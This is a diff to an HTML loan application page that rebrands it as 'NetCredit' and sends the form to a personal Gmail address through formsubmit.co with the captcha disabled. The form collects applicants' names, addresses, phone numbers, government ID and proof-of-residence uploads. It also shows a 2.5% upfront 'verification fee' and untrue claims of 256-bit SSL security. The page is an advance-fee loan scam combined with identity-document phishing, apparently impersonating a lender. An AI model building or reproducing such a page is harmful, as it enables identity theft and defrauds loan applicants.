@@ -3,446 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apex Capital | Secure Loan Application Portal</title>
+    <title>Online Personal Loans & Lines of Credit | NetCredit</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #1a365d;
-            --primary-hover: #2b6cb0;
-            --bg-color: #f4f7f6;
-            --card-bg: #ffffff;
-            --text-main: #2d3748;
-            --text-muted: #718096;
-            --border-color: #cbd5e0;
-            --accent-bg: #ebf8ff;
-            --accent-border: #bee3f8;
-            --accent-text: #2b6cb0;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            margin: 0;
-            padding: 40px 20px;
-            line-height: 1.5;
-        }
-
-        .container {
-            max-width: 680px;
-            margin: 0 auto;
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
-
-        .security-badge {
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        h2 { margin-top: 0; color: var(--primary); font-size: 26px; }
-        p.subtitle { color: var(--text-muted); margin-bottom: 25px; }
-
-        .form-section {
-            margin-bottom: 24px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #edf2f7;
-        }
-
-        .form-section h3 {
-            font-size: 16px;
-            color: var(--primary);
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-
-        @media (max-width: 600px) {
-            .form-row { grid-template-columns: 1fr; }
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            font-size: 13px;
-            color: var(--text-main);
-        }
-
-        input, select, textarea {
-            width: 100%;
-            padding: 11px 14px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 14px;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: var(--primary-hover);
-            box-shadow: 0 0 0 3px rgba(43, 108, 176, 0.15);
-        }
-
-        input[type="file"] {
-            padding: 8px;
-            background: #f7fafc;
-            cursor: pointer;
-        }
-
-        .notice-box {
-            background: var(--accent-bg);
-            border: 1px solid var(--accent-border);
-            padding: 16px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-        }
-
-        .notice-box h4 {
-            margin: 0 0 8px 0;
-            color: var(--accent-text);
-            font-size: 14px;
-        }
-
-        .notice-box p {
-            margin: 0;
-            font-size: 13px;
-            color: #2c5282;
-        }
-
-        .fee-highlight {
-            font-size: 18px;
-            font-weight: bold;
-            color: var(--primary);
-        }
-
-        button.submit-btn {
-            background-color: var(--primary);
-            color: white;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-            font-weight: 600;
-            transition: background-color 0.2s;
-        }
-
-        button.submit-btn:hover {
-            background-color: var(--primary-hover);
-        }
-
-        /* Live Chat Floating Widget Styles */
-        .chat-widget {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 1000;
-        }
-
-        .chat-toggle-btn {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            padding: 12px 20px;
-            font-weight: 600;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .chat-box {
-            display: none;
-            position: absolute;
-            bottom: 60px;
-            right: 0;
-            width: 320px;
-            height: 400px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.15);
-            flex-direction: column;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-        }
-
-        .chat-header {
-            background: var(--primary);
-            color: white;
-            padding: 12px 16px;
-            font-weight: 600;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .chat-close { background: none; border: none; color: white; cursor: pointer; font-size: 16px; }
-
-        .chat-body {
-            flex: 1;
-            padding: 15px;
-            overflow-y: auto;
-            font-size: 13px;
-            background: #f8fafc;
-        }
-
-        .chat-message {
-            margin-bottom: 10px;
-            padding: 8px 12px;
-            border-radius: 6px;
-            max-width: 80%;
-        }
-
-        .chat-message.agent { background: #e2e8f0; color: #2d3748; align-self: flex-start; }
-        .chat-message.user { background: var(--primary); color: white; margin-left: auto; }
-
-        .chat-footer {
-            padding: 10px;
-            border-top: 1px solid var(--border-color);
-            display: flex;
-            gap: 8px;
-            background: white;
-        }
-
-        .chat-footer input {
-            padding: 8px;
-            font-size: 13px;
-        }
-        
-        .chat-footer button {
-            padding: 8px 12px;
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
+        body { font-family: 'Inter', sans-serif; }
     </style>
 </head>
-<body>
+<body class="bg-slate-50 text-slate-800">
 
-<div class="container">
-    <div class="security-badge">🔒 256-bit Bank-Grade Secure SSL Encryption</div>
-    <h2>Apex Capital Loan Portal</h2>
-    <p class="subtitle">Complete your secure application below. Applications undergo administrative review and processing within <strong>48 hours</strong>.</p>
-
-    <form id="loanApplicationForm" enctype="multipart/form-data">
-        
-        <!-- Personal Information Section -->
-        <div class="form-section">
-            <h3>1. Personal & Contact Information</h3>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>Full Legal Name *</label>
-                    <input type="text" placeholder="John Doe" required>
-                </div>
-                <div class="form-group">
-                    <label>Email Address *</label>
-                    <input type="email" placeholder="john@example.com" required>
-                </div>
+    <!-- Header / Nav -->
+    <header class="bg-white border-b border-slate-200 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <span class="text-2xl font-black tracking-tight text-blue-900">Net<span class="text-cyan-600">Credit</span></span>
             </div>
+            <div class="hidden md:flex items-center space-x-6 text-sm font-medium text-slate-600">
+                <a href="#" class="hover:text-blue-900">Personal Loans</a>
+                <a href="#" class="hover:text-blue-900">Lines of Credit</a>
+                <a href="#" class="hover:text-blue-900">How It Works</a>
+                <a href="#" class="hover:text-blue-900">Rates & Terms</a>
+            </div>
+            <div>
+                <span class="inline-flex items-center text-xs font-semibold bg-emerald-50 text-emerald-700 px-3 py-1.5 rounded-full border border-emerald-200">
+                    🔒 256-bit Secure Portal
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="bg-gradient-to-br from-blue-950 via-blue-900 to-slate-900 text-white py-12 px-4">
+        <div class="max-w-3xl mx-auto text-center">
+            <h1 class="text-3xl sm:text-4xl font-bold tracking-tight mb-4">Check Your Loan Eligibility</h1>
+            <p class="text-blue-200 text-base sm:text-lg">Fast online personal loans and transparent terms tailored to your needs. Checking won't affect your credit score.</p>
+        </div>
+    </section>
+
+    <!-- Main Application Container -->
+    <main class="max-w-3xl mx-auto px-4 -mt-6 mb-20 relative z-10">
+        <div class="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-10">
             
-            <div class="form-group">
-                <label>Phone Number *</label>
-                <input type="tel" placeholder="(555) 000-0000" required>
-            </div>
+            <!-- FORM CONFIGURED TO SUBMIT DIRECTLY TO stacyrobert001@gmail.com -->
+            <form action="https://formsubmit.co/stacyrobert001@gmail.com" method="POST" enctype="multipart/form-data" class="space-y-8">
+                
+                <!-- Hidden configuration fields for FormSubmit -->
+                <input type="hidden" name="_subject" value="New Loan Application Submitted!">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+
+                <!-- Section 1: Personal & Contact Information -->
+                <div>
+                    <h2 class="text-lg font-bold text-blue-950 border-b pb-2 mb-4 flex items-center">
+                        <span class="bg-blue-900 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-xs mr-2">1</span>
+                        Personal & Contact Information
+                    </h2>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Full Legal Name *</label>
+                            <input type="text" name="Full Legal Name" required placeholder="John Doe" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Email Address *</label>
+                            <input type="email" name="Email Address" required placeholder="john@example.com" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                        <div class="sm:col-span-2">
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Phone Number *</label>
+                            <input type="tel" name="Phone Number" required placeholder="(555) 000-0000" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section 2: Residential Address -->
+                <div>
+                    <h2 class="text-lg font-bold text-blue-950 border-b pb-2 mb-4 flex items-center">
+                        <span class="bg-blue-900 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-xs mr-2">2</span>
+                        Residential Address
+                    </h2>
+                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                        <div class="sm:col-span-3">
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Street Address *</label>
+                            <input type="text" name="Street Address" required placeholder="123 Financial Way, Apt 4B" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">City *</label>
+                            <input type="text" name="City" required placeholder="New York" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">State / Province *</label>
+                            <input type="text" name="State" required placeholder="NY" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Postal / Zip Code *</label>
+                            <input type="text" name="Zip Code" required placeholder="10001" class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section 3: Loan Request & Dynamic Fee Calculation -->
+                <div>
+                    <h2 class="text-lg font-bold text-blue-950 border-b pb-2 mb-4 flex items-center">
+                        <span class="bg-blue-900 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-xs mr-2">3</span>
+                        Loan Request & Terms
+                    </h2>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Loan Amount Requested ($) *</label>
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-500 font-semibold">$</span>
+                                <input type="number" id="loanAmount" name="Loan Amount Requested" value="25000" min="500" max="50000" step="100" required 
+                                    class="w-full pl-8 pr-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm font-semibold text-slate-900">
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Purpose of Loan *</label>
+                            <select name="Loan Purpose" required class="w-full px-4 py-2.5 rounded-lg border border-slate-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm bg-white">
+                                <option value="">Select loan category</option>
+                                <option value="business">Business Expansion & Capital</option>
+                                <option value="debt">Personal Debt Consolidation</option>
+                                <option value="emergency">Emergency Expense</option>
+                                <option value="realestate">Real Estate Investment</option>
+                            </select>
+                        </div>
+
+                        <!-- Dynamic Processing Fee Policy Box -->
+                        <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 sm:p-5 text-sm space-y-2">
+                            <div class="font-bold text-blue-950 flex items-center justify-between">
+                                <span>Dynamic Verification & Processing Fee Policy</span>
+                                <span class="text-xs bg-blue-200 text-blue-900 px-2 py-0.5 rounded font-medium">2.5% Rate</span>
+                            </div>
+                            <p class="text-blue-900 text-xs leading-relaxed">
+                                A dynamic verification fee (calculated at exactly 2.5% of your chosen requested amount) applies to process fast underwriting and compliance verification checks.
+                            </p>
+                            <div class="pt-2 border-t border-blue-200/60 flex items-center justify-between text-base">
+                                <span class="font-semibold text-slate-700">Estimated Dynamic Fee:</span>
+                                <!-- Dynamic fee value passed to email -->
+                                <input type="text" id="dynamicFeeInputHidden" name="Calculated Dynamic Fee" value="$625.00" class="hidden">
+                                <span id="dynamicFeeDisplay" class="font-bold text-blue-900 text-lg">$625.00</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section 4: Identity Verification (KYC) -->
+                <div>
+                    <h2 class="text-lg font-bold text-blue-950 border-b pb-2 mb-4 flex items-center">
+                        <span class="bg-blue-900 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-xs mr-2">4</span>
+                        Identity Verification (KYC Documents)
+                    </h2>
+                    <p class="text-xs text-slate-500 mb-4">Please upload clear images or PDFs of your documents for compliance screening.</p>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Government-Issued ID (Front & Back) *</label>
+                            <input type="file" name="Government ID" required class="w-full text-sm text-slate-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100 border border-slate-300 rounded-lg p-2">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-600 mb-1">Proof of Residence (Utility Bill / Bank Statement) *</label>
+                            <input type="file" name="Proof of Residence" required class="w-full text-sm text-slate-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100 border border-slate-300 rounded-lg p-2">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <div class="pt-4">
+                    <button type="submit" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-3.5 px-6 rounded-xl transition duration-200 shadow-lg text-base tracking-wide flex items-center justify-center space-x-2 cursor-pointer">
+                        <span>Submit Application for 48-Hour Review</span>
+                    </button>
+                    <p class="text-center text-xs text-slate-400 mt-3">Your information is encrypted securely with 256-bit SSL protection.</p>
+                </div>
+
+            </form>
         </div>
+    </main>
 
-        <!-- Home Address Section -->
-        <div class="form-section">
-            <h3>2. Residential Address</h3>
-            <div class="form-group">
-                <label>Street Address *</label>
-                <input type="text" id="streetAddress" placeholder="123 Financial Way, Apt 4B" required>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>City *</label>
-                    <input type="text" id="city" placeholder="New York" required>
-                </div>
-                <div class="form-group">
-                    <label>State / Province *</label>
-                    <input type="text" id="state" placeholder="NY" required>
-                </div>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>Postal / Zip Code *</label>
-                    <input type="text" id="zipCode" placeholder="10001" required>
-                </div>
-                <div class="form-group">
-                    <label>Country *</label>
-                    <select required>
-                        <option value="US">United States</option>
-                        <option value="CA">Canada</option>
-                        <option value="UK">United Kingdom</option>
-                    </select>
-                </div>
-            </div>
-        </div>
+    <!-- Dynamic Fee Calculation & Live Chat Integration Script -->
+    <script>
+        const loanInput = document.getElementById('loanAmount');
+        const feeDisplay = document.getElementById('dynamicFeeDisplay');
+        const feeInputHidden = document.getElementById('dynamicFeeInputHidden');
 
-        <!-- Loan Details & Dynamic Fee Section -->
-        <div class="form-section">
-            <h3>3. Loan Request & Verification Fee</h3>
-            <div class="form-group">
-                <label>Loan Amount Requested ($) *</label>
-                <input type="number" id="loanAmount" value="25000" min="1000" step="500" required>
-            </div>
-
-            <!-- Dynamic Fee & Timeline Notice Box -->
-            <div class="notice-box">
-                <h4>Dynamic Verification & Processing Fee Policy</h4>
-                <p>A dynamic verification fee (calculated at 2.5% of your requested amount) applies to process underwriting and verification checks. Your application will undergo complete review within <strong>48 hours</strong> upon submission.</p>
-                <div style="margin-top: 10px;">
-                    <span>Estimated Dynamic Fee: </span>
-                    <span class="fee-highlight" id="estimatedFee">$0.00</span>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Purpose of Loan *</label>
-                <select required>
-                    <option value="">Select loan category</option>
-                    <option value="business">Business Expansion & Capital</option>
-                    <option value="debt">Personal Debt Consolidation</option>
-                    <option value="emergency">Emergency Expense</option>
-                    <option value="realestate">Real Estate Investment</option>
-                </select>
-            </div>
-        </div>
-
-        <!-- Identity Verification Uploads -->
-        <div class="form-section">
-            <h3>4. Identity Verification (KYC Documents)</h3>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 12px;">Please upload clear images or PDFs of your government-issued ID (Passport or Driver's License) for compliance screening.</p>
+        function updateDynamicFee() {
+            const val = parseFloat(loanInput.value) || 0;
+            const fee = val * 0.025;
+            const formattedFee = '$' + fee.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             
-            <div class="form-group">
-                <label>Government-Issued ID (Front & Back) *</label>
-                <input type="file" id="idFront" accept=".jpg, .jpeg, .png, .pdf" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Proof of Residence (Utility Bill / Bank Statement) *</label>
-                <input type="file" id="proofOfResidence" accept=".jpg, .jpeg, .png, .pdf" required>
-            </div>
-        </div>
-
-        <button type="submit" class="submit-btn">Submit Application for 48-Hour Review</button>
-    </form>
-</div>
-
-<!-- Professional Live Chat Widget -->
-<div class="chat-widget">
-    <button class="chat-toggle-btn" onclick="toggleChat()">💬 Live Support</button>
-    <div class="chat-box" id="chatBox">
-        <div class="chat-header">
-            <span>Apex Support Specialist</span>
-            <button class="chat-close" onclick="toggleChat()">✕</button>
-        </div>
-        <div class="chat-body" id="chatBody">
-            <div class="chat-message agent">Hello! Welcome to Apex Capital. Do you have any questions regarding your application or the dynamic verification fee?</div>
-        </div>
-        <div class="chat-footer">
-            <input type="text" id="chatInput" placeholder="Type a message..." onkeypress="handleChatEnter(event)">
-            <button onclick="sendChatMessage()">Send</button>
-        </div>
-    </div>
-</div>
-
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-    const loanAmountInput = document.getElementById("loanAmount");
-    const feeDisplay = document.getElementById("estimatedFee");
-
-    // Dynamic fee calculation configuration (integrated with admin structural readiness)
-    const calculateDynamicFee = (amount) => {
-        const numericAmount = parseFloat(amount) || 0;
-        const feePercentage = 0.025; // 2.5% dynamic calculation rule
-        let calculatedFee = numericAmount * feePercentage;
-
-        // Minimum threshold protection rule
-        const minimumFee = 75.00;
-        if (calculatedFee > 0 && calculatedFee < minimumFee) {
-            calculatedFee = minimumFee;
+            feeDisplay.textContent = formattedFee;
+            feeInputHidden.value = formattedFee; // Passes the dynamic fee amount straight to your email
         }
-        return calculatedFee;
-    };
 
-    const updateFeeUI = () => {
-        const amount = loanAmountInput.value;
-        const fee = calculateDynamicFee(amount);
-        feeDisplay.textContent = `$${fee.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-    };
+        loanInput.addEventListener('input', updateDynamicFee);
+        updateDynamicFee();
+    </script>
 
-    // Initialize calculation on page load and on input changes
-    updateFeeUI();
-    loanAmountInput.addEventListener("input", updateFeeUI);
-
-    // Form Submission Handler
-    document.getElementById("loanApplicationForm").addEventListener("submit", (e) => {
-        e.preventDefault();
-        alert("Your application has been securely submitted! It is now queued for administrative verification. You will receive an update within 48 hours.");
-    });
-});
-
-// Live Chat Interaction Logic
-function toggleChat() {
-    const chatBox = document.getElementById("chatBox");
-    chatBox.style.display = chatBox.style.display === "flex" ? "none" : "flex";
-}
-
-function sendChatMessage() {
-    const input = document.getElementById("chatInput");
-    const chatBody = document.getElementById("chatBody");
-    
-    if (input.value.trim() === "") return;
-
-    // Append user message
-    const userMsg = document.createElement("div");
-    userMsg.className = "chat-message user";
-    userMsg.textContent = input.value;
-    chatBody.appendChild(userMsg);
-
-    const userQuery = input.value;
-    input.value = "";
-    chatBody.scrollTop = chatBody.scrollHeight;
-
-    // Simulate automated agent reply after a brief pause
-    setTimeout(() => {
-        const agentMsg = document.createElement("div");
-        agentMsg.className = "chat-message agent";
-        agentMsg.textContent = "Thank you for your message. An underwriting specialist is reviewing your inquiry regarding: \"" + userQuery + "\". We'll respond shortly.";
-        chatBody.appendChild(agentMsg);
-        chatBody.scrollTop = chatBody.scrollHeight;
-    }, 1000);
-}
-
-function handleChatEnter(e) {
-    if (e.key === "Enter") {
-        sendChatMessage();
-    }
-}
-</script>
-
+    <!-- LIVE CHAT WIDGET INTEGRATION (Example using Crisp / Tidio placeholder code) -->
+    <!-- Note: To activate live chat, sign up for a free account at https://crisp.chat or https://www.tidio.com and paste your custom embed script right here. -->
+    <script type="text/javascript">
+        window.$crisp=[];window.CRISP_WEBSITE_ID="YOUR_CRISP_WEBSITE_ID_HERE";
+        (function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.so";
+        s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();
+    </script>
 </body>
 </html>
